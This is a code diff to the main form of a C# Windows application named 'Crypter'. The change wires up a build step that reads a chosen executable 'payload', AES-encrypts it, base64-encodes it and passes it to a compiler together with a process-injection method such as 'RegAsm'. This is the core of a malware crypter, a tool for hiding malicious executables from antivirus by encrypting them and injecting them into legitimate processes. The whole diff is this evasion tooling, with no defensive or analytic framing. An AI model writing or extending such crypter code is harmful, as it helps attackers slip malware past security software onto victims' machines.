@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -13,8 +14,10 @@ namespace Crypter
 {
     public partial class Form1 : Form
     {
+        private string currentInjection;
         public Form1()
         {
+            this.currentInjection = "RegAsm";
             InitializeComponent();
         }
 
@@ -25,14 +28,19 @@ namespace Crypter
 
         private void btnServer_Click(object sender, EventArgs e)
         {
-            using(OpenFileDialog ofd = new OpenFileDialog())
+            using (OpenFileDialog ofd = new OpenFileDialog())
             {
                 ofd.Filter = "Excutable (*.exe)|*.exe";
                 ofd.Title = "Select .NET File to Crypter....";
 
                 if (ofd.ShowDialog() == DialogResult.OK)
                 {
-                    txtServer.Text = ofd.FileName;
+                    txtPayload.Text = ofd.FileName;
+                    btnBuild.Enabled = true;
+                }
+                else
+                {
+                    btnBuild.Enabled = false;
                 }
             }
         }
@@ -41,7 +49,7 @@ namespace Crypter
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
             {
-                ofd.Filter = "Excutable (*.ico)|*.ico";
+                ofd.Filter = "Icon (*.ico)|*.ico";
                 ofd.Title = "Select Icon to use....";
 
                 if (ofd.ShowDialog() == DialogResult.OK)
@@ -79,13 +87,33 @@ namespace Crypter
         {
             try
             {
-                Compiler compiler = new Compiler(txtKeyGen.Text, txtIVGen.Text);
+                //  Read the payload file and store in rawData
+                byte[] rawData = File.ReadAllBytes(txtPayload.Text);
+                
+                //  Encrypt payload with AES
+                byte[] encRawData = Encryption.AesEncryption(rawData, Convert.FromBase64String(txtKeyGen.Text), Convert.FromBase64String(txtIVGen.Text));
+
+                //  Convert to string
+                string base64Aes = Convert.ToBase64String(encRawData);
+
+                //  Build file to excutable file
+                Compiler compiler = new Compiler(base64Aes, txtKeyGen.Text, txtIVGen.Text, currentInjection);
                 compiler.Compile();
             }
             catch (Exception ex)
             {
                 Console.WriteLine(ex.Message);
             }
+        }
+
+        private void radioButton1_CheckedChanged(object sender, EventArgs e)
+        {
+           this.currentInjection = radioButton1.Text;
+        }
+
+        private void radioButton2_CheckedChanged(object sender, EventArgs e)
+        {
+            this.currentInjection = radioButton2.Text;
         }
     }
 }
